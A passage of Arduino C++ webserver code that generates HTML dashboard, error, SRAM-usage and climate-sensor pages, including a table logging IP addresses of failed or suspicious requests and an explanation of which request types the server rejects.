      G_EthernetClient.print(F("**ERROR**</td></tr>"));
    //
#endif
  }

  int l_data_size;
  int l_heap_size;
  int l_stack_size;
  int l_ram_free;
  int l_heap_free;
  int l_heap_list_sizes[DC_HeapListCount];

  RamUsage(l_data_size, l_heap_size, l_ram_free, l_stack_size, l_heap_free, l_heap_list_sizes);

  G_EthernetClient.print(F("<tr><td>Free RAM (Min)</td><td>"));
  G_EthernetClient.print(l_ram_free);
  G_EthernetClient.print(F(" ("));
  G_EthernetClient.print(G_RAMData[DC_RAMMinFree].Value);
  G_EthernetClient.print(" ");
  G_EthernetClient.print(TimeToHHMM(G_RAMData[DC_RAMMinFree].TimeOfDay));
  G_EthernetClient.print(F(")</td></tr>"));

  G_EthernetClient.print(F("<tr><td>Stack Size (Max)</td><td>"));
  G_EthernetClient.print(l_stack_size);
  G_EthernetClient.print(F(" ("));
  G_EthernetClient.print(G_RAMData[DC_RAMStackSize].Value);
  G_EthernetClient.print(" ");
  G_EthernetClient.print(TimeToHHMM(G_RAMData[DC_RAMStackSize].TimeOfDay));
  G_EthernetClient.print(F(")</td></tr>"));

  G_EthernetClient.print(F("<tr><td>Heap Size (Max)</td><td>"));
  G_EthernetClient.print(l_heap_size);
  G_EthernetClient.print(F(" ("));
  G_EthernetClient.print(G_RAMData[DC_RAMHeapSize].Value);
  G_EthernetClient.print(" ");
  G_EthernetClient.print(TimeToHHMM(G_RAMData[DC_RAMHeapSize].TimeOfDay));
  G_EthernetClient.print(F(")</td></tr>"));

  G_EthernetClient.print(F("<tr><td>Free Heap (Max)</td><td>"));
  G_EthernetClient.print(l_heap_free);
  int l_percent = int((float(l_heap_free) * 100 / l_heap_size) + 0.5);
  G_EthernetClient.print(F(", "));
  G_EthernetClient.print(l_percent);
  G_EthernetClient.print(F("% ("));
  G_EthernetClient.print(G_RAMData[DC_RAMHeapMaxFree].Value);
  G_EthernetClient.print(" ");
  G_EthernetClient.print(TimeToHHMM(G_RAMData[DC_RAMHeapMaxFree].TimeOfDay));
  G_EthernetClient.print(F(")</td></tr>"));

  G_EthernetClient.println(F("<tr><td>Free Heap List</td><td>"));
  if (l_heap_list_sizes[0] == 0)
    G_EthernetClient.print(F("[[NULL]]"));
  else {
    for (byte l_index = 0; l_index < DC_HeapListCount; l_index++) {
      if (l_heap_list_sizes[l_index] == 0)
        break;
      //
      if (l_index != 0)
        G_EthernetClient.print(", ");
      //
      G_EthernetClient.print(l_heap_list_sizes[l_index]);
    }
  }
  G_EthernetClient.print(F("</td></tr>"));

  if (!G_Mobile_Flag) {
    G_EthernetClient.print(F("<tr><td>Loop Heap Statistics<br>Size/Free/Count</td><td>"));
    G_EthernetClient.print(G_Loop_Heap_Size);
    G_EthernetClient.print("/");
    G_EthernetClient.print(G_Loop_Free_Heap_Size);
    G_EthernetClient.print("/");
    G_EthernetClient.print(G_Loop_Free_Heap_Count);
    G_EthernetClient.print(F(            "</td></tr>"));

    if (G_CacheCount) {
      G_EthernetClient.print(F(          "<tr><td>Cache Record Count/Size</td><td>"));
      G_EthernetClient.print(                 G_CacheCount);
      G_EthernetClient.print("/");
      G_EthernetClient.print(                 G_CacheSize);
      G_EthernetClient.print(F(            "</td></tr>"));
    }
  }

  if (!G_Mobile_Flag) {
    SPIDeviceSelect(DC_SDCardSSPin);
    String l_filename = EPSR(E_slFLASHdtTXT_282);
    if (SD.exists(&l_filename[0])) {
      File l_file = SD.open(&l_filename[0], FILE_READ);
      if (l_file) {
        SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
        G_EthernetClient.print(F("<tr>"));
        G_EthernetClient.println(F("<td colspan=\"2\" style=\"vertical-align:top;\">"));
        G_EthernetClient.println(F("<table border=0 width=100%>"));
        G_EthernetClient.print  (F("<tr style=\"font-family:Courier;font-size:16px;background-color:White;\">"));
        G_EthernetClient.println(F("<td align=\"left\">"));

        SPIDeviceSelect(DC_SDCardSSPin);
        while (l_file.available()) {
          String l_line = l_file.readStringUntil('\n');
          SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
          G_EthernetClient.println(l_line);
          SPIDeviceSelect(DC_SDCardSSPin);
        }
        l_file.close();

        SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
        G_EthernetClient.print(F("</td>"));
        G_EthernetClient.print(F("</tr>"));
        G_EthernetClient.println(F("</table>"));
        G_EthernetClient.print(F("</td>"));
        G_EthernetClient.print(F("</tr>"));
      }
    }
    SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
  } //Flash text not for mobile

  G_EthernetClient.print(F(        "</table>")); //2nd table on first row of form table
  G_EthernetClient.println(F(    "</td>"));  //first row of form table

  //Display recent HTMLLog Files
  G_EthernetClient.println(F("<td style=\"vertical-align:top;\">")); //first row of form table (3rd column)
  G_EthernetClient.println(F(  "<table>")); //create a new RHS table - we need three rows/sections

  G_EthernetClient.println(F(  "<tr><td>")); //first row of RHS three table block
  G_EthernetClient.println(F(  "<table border=1 width=100%>")); //overall table for html request block
  G_EthernetClient.println(F(  "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.println(F(    "<td><b>PUBLIC ACTIVITY</b></td></tr>"));

  //Initialise Date/Time info
  int l_dd, l_mm, l_yyyy, l_hh, l_min = 0;
  unsigned long l_date = Date();
  DateDecode(l_date, &l_dd, &l_mm, &l_yyyy);
  TimeDecode(Now(), &l_hh, &l_min);
  String l_directory    = "";
  String l_sub_filename = "";

  G_EthernetClient.println(F("<tr><td>"));
  G_EthernetClient.println(F("<table style=\"font-family:Courier;background-color:White;text-align:left;font-size:16px;\" width=100%>"));
  G_EthernetClient.print(F("<tr border=0 style=\"background-color:DarkSeaGreen;\">"));
  G_EthernetClient.println(F("<td><b>FILENAME</b></td><td style=\"text-align:right;\"><b>SIZE</b></td></tr>"));
  int l_file_counter = 0;
  for (int l_file_count = 0; l_file_count < 12; l_file_count++) { //6 * 4 = 24 hours
    l_directory    = "/" + EPSR(E_HTMLREQUsl_143) + ZeroFill(l_yyyy, 4) + "/" + ZeroFill(l_mm, 2) + "/" + ZeroFill(l_dd, 2) + "/";
    l_sub_filename = "HTM" + ZeroFill(l_mm, 2) + ZeroFill(l_dd, 2);
    String l_sub = GetSubFileChar(l_hh);
    String l_filename = l_directory + l_sub_filename + l_sub + ".TXT";
    SPIDeviceSelect(DC_SDCardSSPin);
    if (SD.exists(&l_filename[0])) {
      l_file_counter++;
      SPIDeviceSelect(DC_EthernetSSPin);
      if ((UserLoggedIn()) ||
          (LocalIP(G_RemoteIPAddress))) {
        G_EthernetClient.print(F("<tr><td><a href=\""));
        G_EthernetClient.print(l_filename);
        G_EthernetClient.print(F("/\">"));
        G_EthernetClient.print(l_sub_filename + l_sub);
        G_EthernetClient.print(F(".TXT</a></td>"));
      }
      else { //PUBLIC
        G_EthernetClient.print(F("<tr><td>"));
        G_EthernetClient.print(l_sub_filename + l_sub);
        G_EthernetClient.print(F(".TXT</td>"));
      }
      G_EthernetClient.print(F("<td style=\"text-align:right;\">"));
      SPIDeviceSelect(DC_SDCardSSPin);
      File l_SD_file = SD.open(&l_filename[0], FILE_READ);
      unsigned long l_filesize = l_SD_file.size();
      l_SD_file.close();
      SPIDeviceSelect(DC_EthernetSSPin);
      G_EthernetClient.print(l_filesize);
      G_EthernetClient.println(F("</td></tr>"));
    } //File found
    SPIDeviceSelect(DC_EthernetSSPin); //Just in case
    //subtract four hours
    l_hh -= 4;
    if (l_hh < 0) {
      l_hh += 24;
      l_date -= 100000; //Subtract one day
      DateDecode(l_date, &l_dd, &l_mm, &l_yyyy);
    }
    if (l_file_counter == 6)
      break;
    //
  } //list six most recent files in reverse order from last two days (12 files)
  G_EthernetClient.println(F("</table>"));    //white file list table
  G_EthernetClient.println(F("</td></tr>"));  //white list of files
  G_EthernetClient.println(F("</table>"));    ////overall table for html request block
  G_EthernetClient.println(F("</td></tr>"));  //End of first RHS block table row

  G_EthernetClient.println(F("<tr><td>"));    //2nd RHS block table row
  G_EthernetClient.println(F(      "<table border=1 width=100%>")); //overall table for html request block
  G_EthernetClient.println(F(    "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.println(F(      "<td><b>CRAWLER ACTIVITY</b></td></tr>"));
  G_EthernetClient.println(F(    "<tr><td>"));
  G_EthernetClient.println(F(      "<table style=\"background-color:White;font-size:16px;\" width=100%>")); //table for the list of crawler records

  G_EthernetClient.println(F("<tr border=0 style=\"background-color:DarkSeaGreen;\">"));
  G_EthernetClient.print(F("<td><b>CRAWLER</b>"));
  G_EthernetClient.print(F("</td><td><b>MONTH"));
  G_EthernetClient.print(F("</b></td><td><b>DAY"));
  G_EthernetClient.println(F("</b></td></tr>"));

  int l_total1 = 0;
  int l_total2 = 0;
  int l_other1 = 0;
  int l_other2 = 0;
  for (byte l_index = 0; l_index < G_CrawlerCount; l_index++) {
    if ((l_index < 4) || //Force baidu, bing, google, yandex
        (G_StatCrwlDay[l_index] != 0)) {
      G_EthernetClient.print(F("<tr><td>"));
      G_EthernetClient.print(G_WebCrawlers[l_index]);
      G_EthernetClient.print(F("</td><td>"));
      G_EthernetClient.print(FormatAmt(G_StatCrwlMth[l_index], 0));
      G_EthernetClient.println(F("</td><td>"));
      G_EthernetClient.print(FormatAmt(G_StatCrwlDay[l_index], 0));
      G_EthernetClient.println(F("</td></tr>"));
    }
    else {
      l_other1 += G_StatCrwlMth[l_index];
      l_other2 += G_StatCrwlDay[l_index];
    }
    l_total1 += G_StatCrwlMth[l_index];
    l_total2 += G_StatCrwlDay[l_index];
  } //for each crawler statistic

  //DISPLAY OTHER and MONTH AND DAY TOTALS
  G_EthernetClient.print(F("<tr><td>OTHER"));
  G_EthernetClient.print(F("</td><td>"));
  G_EthernetClient.print(FormatAmt(l_other1, 0));
  G_EthernetClient.print(F("</td><td>"));
  G_EthernetClient.print(FormatAmt(l_other2, 0));
  G_EthernetClient.println(F("</td></tr>"));

  G_EthernetClient.print(F("<tr><td><b>TOTALS</b>"));
  G_EthernetClient.print(F("</td><td><b>"));
  G_EthernetClient.print(FormatAmt(l_total1, 0));
  G_EthernetClient.print(F("</b></td><td><b>"));
  G_EthernetClient.print(FormatAmt(l_total2, 0));
  G_EthernetClient.println(F("</b></td></tr>"));

  G_EthernetClient.println(F(      "</table>")); //table for the list of IP address
  G_EthernetClient.println(F(    "</td></tr>"));
  G_EthernetClient.println(F(  "</table>")); //overall table for crawler activity block
  G_EthernetClient.println(F("</td></tr>"));  //End of 2nd RHS block table row

  G_EthernetClient.println(F("<tr><td>"));    //third RHS block table row
  G_EthernetClient.println(F(  "<table border=1>")); //overall table for html request block
  G_EthernetClient.println(F(    "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.println(F(      "<td><b>HACKER ACTIVITY</b></td></tr>"));
  G_EthernetClient.println(F(    "<tr><td>"));
  G_EthernetClient.println(F(      "<table style=\"background-color:White;font-size:16px;\" width=100%>")); //table for the list of IP address

  G_EthernetClient.println(F("<tr border=0 style=\"background-color:DarkSeaGreen;\">"));
  G_EthernetClient.print(F("<td><b>TIME</b>"));
  G_EthernetClient.print(F("</td><td><b>TYPE"));
  G_EthernetClient.print(F("</td><td><b>IP ADDRESS"));
  G_EthernetClient.print(F("</b></td><td><b>COUNT"));
  G_EthernetClient.println(F("</b></td></tr>"));

  //Add hacker log ro Page Actions
  unsigned long l_prev_datetime = Now();
  unsigned long l_36_hours_ago  = Now() - 150000;
  int l_next_record;
  int l_count = 0;
  while (true) {
    l_count++;
    l_next_record = GetNextIPAddressTableRecord(l_prev_datetime);
    if ((l_next_record == -1) ||
        (G_FailedHTMLRequestList[l_next_record].LastDateTime < l_36_hours_ago) ||
        (l_count == 9)) //Max 8
      break; //We are finished
    //

    //Print the next record
    G_EthernetClient.print(F("<tr>"));

    G_EthernetClient.print(F("<td>"));
    G_EthernetClient.print(TimeToHHMM(G_FailedHTMLRequestList[l_next_record].LastDateTime));
    G_EthernetClient.print(F("</td>"));

    G_EthernetClient.print(F("<td>"));
    G_EthernetClient.print(G_FailedHTMLRequestList[l_next_record].BanType);
    G_EthernetClient.print(F("</td>"));

    G_EthernetClient.print(F("<td>"));
    for (byte l_byte = 0; l_byte < DC_IPAddressFieldCount; l_byte++) {
      if ((l_byte == 3) && (G_FailedHTMLRequestList[l_next_record].IPAddress[l_byte] == 0))
        G_EthernetClient.print("*");
      else
        G_EthernetClient.print(G_FailedHTMLRequestList[l_next_record].IPAddress[l_byte]);
      //
      if (l_byte < 3)
        G_EthernetClient.print(".");
      //
    }
    G_EthernetClient.print(F("</td>"));

    G_EthernetClient.print(F("<td>"));
    G_EthernetClient.print(G_FailedHTMLRequestList[l_next_record].AttemptCount);
    G_EthernetClient.print(F("</td>"));

    G_EthernetClient.println(F("</tr>"));
  } //for each ip address record in last 36 hours (max 8)

  G_EthernetClient.println(F(      "</table>")); //table for the list of IP address
  G_EthernetClient.println(F(    "</td></tr>"));
  G_EthernetClient.println(F(  "</table>")); //overall table for failed request block
  G_EthernetClient.println(F("</td></tr>"));  //End of third RHS block table row

  G_EthernetClient.println(F("</table>")); //RHS table
  G_EthernetClient.println(F("</td>"));  //first row of form table (3rd column)

  G_EthernetClient.println(F(  "</tr>"));    //first row of form table
  G_EthernetClient.print(F(  "</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //DashboardWebPage

//----------------------------------------------------------------------------------------------

float GetUPSBatteryVoltage() {
  const byte c_proc_num = 124;
  Push(c_proc_num);
  float l_voltage = 0;
  //Take twenty readings and average them
  for (int l_count = 0; l_count < 20; l_count++) {
    l_voltage += (float) analogRead(GC_VoltagePin);
    delay(10);
  }
  l_voltage = l_voltage / 422 / 2;
  CheckRAM();
  Pop(c_proc_num);
  return l_voltage;
} //GetUPSBatteryVoltage

//----------------------------------------------------------------------------------------------

void ErrorWebPage() {
  const byte c_proc_num = 107;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage2(EPSR(E_400_Bad_Request_219), EPSR(E_ERROR_PAGE_299));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(999, EPSR(E_ERROR_PAGE_299), St_Error_Page_WPE);

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F(        "</table>"));
  G_EthernetClient.print(F(      "</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F(    "<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F(      "<table border=\"1\" style=\"width:100%\">"));
  G_EthernetClient.println(F("<tr style=\"font-family:Courier;font-size:20px;background-color:White;text-align:left;\"><td>"));

  G_EthernetClient.println(F("<b>Regarding your html request ... </b><br><br>"));
  G_EthernetClient.println(F("You have been redirected to this web page because you made an invalid html request to the "
                             "wesite at http://www.2wg.co.nz. This website is an Arduino webserver application that does "
                             "not support many of the common internet technologies that may have been the subject of your "
                             "html request. Your redirection to this web page will be related to:<br><br>"));
  G_EthernetClient.println(F("<b>URL:</b> - Only the GET, POST and HEAD html request commands are supported. Your URL "
                             "request cannot be longer than 128 bytes and must end with 'HTTP/X.X'.<br><br>"));
  G_EthernetClient.println(F("<b>Host:</b> - The host field is a requirement of html requests. If your html request was software "
                             "generated and does not include the host field then you will end up here.<br><br>"));
  G_EthernetClient.println(F("<b>URL Extensions:</b> - This Arduino web server application does not support URLs that end in .asp, .cgi, .htm, "
                             ".html, .php, or .xml. Submit any URL for these common internet technologies and you will end up here.<br><br>"));
  G_EthernetClient.println(F("<b>(F)CKEditor:</b> - This Arduino web server application does not support the (F)CKEditor. Submit any URL "
                             "related to the use of this javascript online editor and you will end up here.<br><br>"));
  G_EthernetClient.println(F("<b>Cross Site Scripting:</b> - If this system detects that your html request includes browser scripts "
                             "you will end up here. Note that cross site scripting hacks are unlikely to succeed because scripts "
                             "within an html request are typically mangled by the Arduino web server application before being written to log files.<br><br>"));
  G_EthernetClient.println(F("<b>LAN Commands:</b> - You will end up here if from the external world wide web you submit "
                             "URLs intended for execution only on the Arduino system's local area network.<br><br>"));
  G_EthernetClient.println(F("<b>Password Failures:</b> - If you enter an invalid password on the application login "
                             "screen you will end up here.<br><br>"));
  G_EthernetClient.println(F("<b>Proxy Requests:</b> - The Arduino application web server at this website will reject "
                             "proxy requests and you will end up here.<br><br>"));
  G_EthernetClient.println(F("<b>Page Numbers:</b> - The standard web pages of this website are accessed via page "
                             "numbered URLs. If you attempt to access an invalid web page (number or alphabetic) you will end up here.<br><br>"));
  G_EthernetClient.println(F("<b>Folders and Files:</b> - Folders and files on the Arduino system’s SD card are accessed by "
                             "SD Card folder and filenames. Submitting an html request with an invalid folder or filename, "
                             "or a valid filename to which access is restricted will land you here.<br><br>"));
  G_EthernetClient.println(F("<b>More Information:</b> - If you would like to know more about the Arduino technology that is delivering "
                             "this website, source code and documentation is available for downloading in the PUBLIC folder on "
                             "the application’s SD Card browsing web page. Start with the README.TXT file in the PUBLIC folder."));

  G_EthernetClient.print(F("</td></tr></table>"));
  G_EthernetClient.println(F(    "</td>"));  //first row

  G_EthernetClient.println(F(  "</tr>"));
  G_EthernetClient.print(F(  "</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //ErrorWebPage

//----------------------------------------------------------------------------------------------

void SRAMUsageWebPage() {
  const byte c_proc_num = 23;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_CURRENT_RAM_70));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(800, EPSR(E_CURRENT_RAM_70), St_RAM_Usage_WPE);

  G_EthernetClient.println(F("<tr><td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F("<table border=1>"));
  G_EthernetClient.print  (F("<tr style=\"font-family:Courier;background-color:White;\">"));
  G_EthernetClient.println(F("<td align=\"left\">"));
  if (!G_RAM_Checking) {
    G_EthernetClient.print  (F("<b>SRAM CHECKING IS OFF</b><br>"));
    G_EthernetClient.print  (F("Statistics now displayed<br>"));
    G_EthernetClient.print  (F("are NOT CURRENT!"));
  }
  else {
    G_EthernetClient.print  (F("<b>SRAM CHECKING IS ON</b><br>"));
    G_EthernetClient.print  (F("Statistics now displayed<br>"));
    G_EthernetClient.print  (F("are current!"));
  }
  G_EthernetClient.println(F("<br>"));
  G_EthernetClient.print(F("</td>"));
  G_EthernetClient.print(F("</tr>"));
  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.print(F("</td></tr>"));

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F("</table>"));
  G_EthernetClient.print(F("</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F(    "<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F(      "<table border=1>"));
  G_EthernetClient.println(F(        "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.println(F(          "<td><b>CURRENT SRAM USAGE</b></td>"));
  G_EthernetClient.println(F(          "<td><b>VALUE</b></td>"));
  G_EthernetClient.println(F(        "</tr>"));

  int l_data_size;
  int l_heap_size;
  int l_stack_size;
  int l_ram_free;
  int l_heap_free;
  int l_heap_list_sizes[DC_HeapListCount];

  RamUsage(l_data_size, l_heap_size, l_ram_free, l_stack_size, l_heap_free, l_heap_list_sizes);

  G_EthernetClient.print(F(          "<tr>"));
  G_EthernetClient.println(F(          "<td>Data Size</td>"));
  G_EthernetClient.print(F(            "<td>"));
  G_EthernetClient.print(                 l_data_size);
  G_EthernetClient.print(F(            "</td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.print(F(          "<tr>"));
  G_EthernetClient.println(F(          "<td>Stack Size</td>"));
  G_EthernetClient.print(F(            "<td>"));
  G_EthernetClient.print(                 l_stack_size);
  G_EthernetClient.print(F(            "</td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.print(F(          "<tr>"));
  G_EthernetClient.println(F(          "<td>Free SRAM</td>"));
  G_EthernetClient.print(F(            "<td>"));
  G_EthernetClient.print(                 l_ram_free);
  G_EthernetClient.print(F(            "</td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.print(F(          "<tr>"));
  G_EthernetClient.println(F(          "<td>Heap Size</td>"));
  G_EthernetClient.print(F(            "<td>"));
  G_EthernetClient.print(                 l_heap_size);
  G_EthernetClient.print(F(            "</td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.print(F(          "<tr>"));
  G_EthernetClient.println(F(          "<td>Free Heap Size</td>"));
  G_EthernetClient.print(F(            "<td>"));
  G_EthernetClient.print(                 l_heap_free);
  int l_percent = int((float(l_heap_free) * 100 / l_heap_size) + 0.5);
  G_EthernetClient.print(", ");
  G_EthernetClient.print(l_percent);
  G_EthernetClient.print("%");
  G_EthernetClient.print(F(            "</td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.println(F(          "<tr><td>Free Heap List</td><td>"));
  if (l_heap_list_sizes[0] == 0)
    G_EthernetClient.print(F("[[NULL]]"));
  else {
    for (byte l_index = 0; l_index < DC_HeapListCount; l_index++) {
      if (l_heap_list_sizes[l_index] == 0)
        break;
      //
      if (l_index != 0)
        G_EthernetClient.print(", ");
      //
      G_EthernetClient.print(l_heap_list_sizes[l_index]);
    }
  }
  G_EthernetClient.print(F(            "</td></tr>"));

  G_EthernetClient.print(F(          "<tr><td>Cache Record Count/Size</td><td>"));
  G_EthernetClient.print(                 G_CacheCount);
  G_EthernetClient.print("/");
  G_EthernetClient.print(                 G_CacheSize);
  G_EthernetClient.print(F(            "</td></tr>"));

  SPIDeviceSelect(DC_SDCardSSPin);
  String l_filename = EPSR(E_CHECKRAMdtTXT_166);
  File l_check_ram_file;
  boolean l_checkram_file_OK = true;
  if (!SD.exists(&l_filename[0]))
    l_checkram_file_OK = false;
  else {
    l_check_ram_file = SD.open(&l_filename[0], FILE_READ);
    if (!l_check_ram_file)
      l_checkram_file_OK = false;
    //
  }
  SPIDeviceSelect(DC_EthernetSSPin);

  for (byte l_idx = 0; l_idx < DC_RAMDataCount; l_idx++) {
    G_EthernetClient.println(F(        "<tr style=\"background-color:Khaki;\"><td><b>"));
    G_EthernetClient.println(SRAMStatisticLabel(l_idx));
    G_EthernetClient.println(F(          "</b></td><td><b>VALUE</b></td>"));
    G_EthernetClient.println(F(        "</tr>"));

    G_EthernetClient.print(F(          "<tr>"));
    G_EthernetClient.println(F(          "<td>Call Hierarchy</td>"));
    G_EthernetClient.print(F(            "<td>"));
    for (byte l_idxyz = 0; l_idxyz < DC_CallHierarchyCount; l_idxyz++) {
      if (G_RAMData[l_idx].CallHierarchy[l_idxyz] == 0)
        break;
      //
      if (l_checkram_file_OK == true)
        G_EthernetClient.print(DirectFileRecordRead(l_check_ram_file, 32, G_RAMData[l_idx].CallHierarchy[l_idxyz])); //32 is record length incl CR/LF
      else
        G_EthernetClient.print(G_RAMData[l_idx].CallHierarchy[l_idxyz]);
      //
      G_EthernetClient.println(F("<br>"));
    }
    G_EthernetClient.print(F(            "</td>"));
    G_EthernetClient.println(F(        "</tr>"));

    G_EthernetClient.print(F(          "<tr>"));
    G_EthernetClient.println(F(          "<td>Time</td>"));
    G_EthernetClient.print(F(            "<td>"));
    G_EthernetClient.print(                 TimeToHHMMSS(G_RAMData[l_idx].TimeOfDay));
    G_EthernetClient.print(F(            "</td>"));
    G_EthernetClient.println(F(        "</tr>"));

    G_EthernetClient.print(F(          "<tr>"));
    G_EthernetClient.println(F(          "<td>Statistic Value</td>"));
    G_EthernetClient.print(F(            "<td>"));
    G_EthernetClient.print(                 G_RAMData[l_idx].Value);
    G_EthernetClient.print(F(            "</td>"));
    G_EthernetClient.println(F(        "</tr>"));

    if (l_idx == DC_RAMHeapMaxFree) {
      G_EthernetClient.print(F(          "<tr>"));
      G_EthernetClient.println(F(          "<td>Free Heap List</td>"));
      G_EthernetClient.print(F(            "<td>"));
      if (G_HeapMaxFreeList[0] == 0)
        G_EthernetClient.print(F("NULL"));
      else {
        for (byte l_index = 0; l_index < DC_HeapListCount; l_index++) {
          //G_EthernetClient.print(G_RAMData[l_idx].HeapFreeList);
          if (G_HeapMaxFreeList[l_index] == 0)
            break;
          //
          if (l_index != 0)
            G_EthernetClient.print(", ");
          //
          G_EthernetClient.print(G_HeapMaxFreeList[l_index]);
        }
      }
      G_EthernetClient.print(F(            "</td>"));
      G_EthernetClient.println(F(        "</tr>"));
    }

  } //for each SRAM statistic
  if (l_checkram_file_OK == true) {
    SPIDeviceSelect(DC_SDCardSSPin);
    l_check_ram_file.close();
    SPIDeviceSelect(DC_EthernetSSPin);
  }

  G_EthernetClient.print(F(        "</table>"));
  G_EthernetClient.println(F(    "</td>"));  //first row

  G_EthernetClient.println(F(  "</tr>"));
  G_EthernetClient.print(F(  "</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //SRAMUsageWebPage

//----------------------------------------------------------------------------------------------

void RecentClimateWebPage() {
  const byte c_proc_num = 24;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_RECENT_CLIMATE_71));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(100, EPSR(E_RECENT_CLIMATE_71), St_Recent_Climate_WPE);

  //If logged in show period change options
  if (UserLoggedIn()) {
    G_EthernetClient.println(F(        "<tr style=\"background-color:Khaki;\">"));
    G_EthernetClient.println(F(            "<td><b>PAGE ACTIONS</b></td>"));
    G_EthernetClient.println(F(        "</tr>"));

    G_EthernetClient.print(F(          "<tr>"));
    G_EthernetClient.print(F(          "<td>"));
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[9]);
    G_EthernetClient.println(F("/>Five Minute Periods</a><br>"));
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[10]);
    G_EthernetClient.println(F("/>Qtr Hour Periods</a><br>"));
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[11]);
    G_EthernetClient.println(F("/>Half Hour Periods</a><br>"));
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[12]);
    G_EthernetClient.println(F("/>One Hour Periods</a><br>"));
    G_EthernetClient.println(F(        "</td>"));
    G_EthernetClient.println(F(        "</tr>"));
  } //If logged in show period change options

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F(        "</table>"));
  G_EthernetClient.print(F(      "</td>"));

  int l_array_count;
  if (G_Mobile_Flag)
    l_array_count = DC_ClimatePeriodCount; //6?
  else
    l_array_count = DC_ClimatePeriodCount;
  //

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F(    "<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F(      "<table border=1>"));
  G_EthernetClient.print(F(          "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F(            "<td><b>SENSOR</b></td>"));
  G_EthernetClient.print(F(            "<td><b>STATISTIC</b></td>"));
  long l_period = G_NextClimateUpdateTime + 100000; //Add one day so we can go backwards just after midnight
  l_period      = l_period - (100000 * DC_ClimatePeriodCount / G_Periods_Per_Day) + 2; //force second rounding up
  G_EthernetClient.print(F(          "<td><b>NOW</b></td>"));
  //for (int l_count = (DC_ClimatePeriodCount - 1); l_count >= 0; l_count--) {
  for (int l_count = (l_array_count - 1); l_count >= 0; l_count--) {
    G_EthernetClient.print(F(          "<td><b>"));
    G_EthernetClient.print(               TimeToHHMM(l_period + (100000 * l_count / G_Periods_Per_Day)));
    G_EthernetClient.print(F(          "</b></td>"));
  }
  G_EthernetClient.println(F(        "</tr>"));

  //temperature - then humidity
  for (byte l_count = 0; l_count < 2; l_count++) {
#ifdef D_2WGApp
    double l_front_door_temp = 0;
    double l_out_temp = 0;
    double l_roof_space_temp = 0;
#endif
    int l_temp, l_hum;
    //We don't extract new DHT readings until at least two seconds after any previous readings
    while (CheckSecondsDelay(G_DHTDelayTimer, C_OneSecond * 2) == false) {
    }//Do Nothing
    G_DHTDelayTimer = millis();
    for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++) {
      int l_dht_result = DHTRead(l_sensor, l_temp, l_hum);
      //l_temp and l_hum are standardised values
      //l_temp is plus 35 degrees and then times ten
      String l_stat = "";
      int *l_row;
      double l_value = 0;
      switch (l_count) {
        case 0:
          l_stat = EPSR(E_Temperature_72);
          l_row = G_ArrayTemp[l_sensor].TempPeriodic;
          if (l_dht_result == DHTLIB_OK) {
            l_value = l_temp; //AdjustSensorTemperature(l_sensor,Get2WGTemp());
            //Save current temp stats for later differential reporting
#ifdef D_2WGApp
            if (l_sensor == C_Front_Door_Sensor)
              l_front_door_temp = l_value;
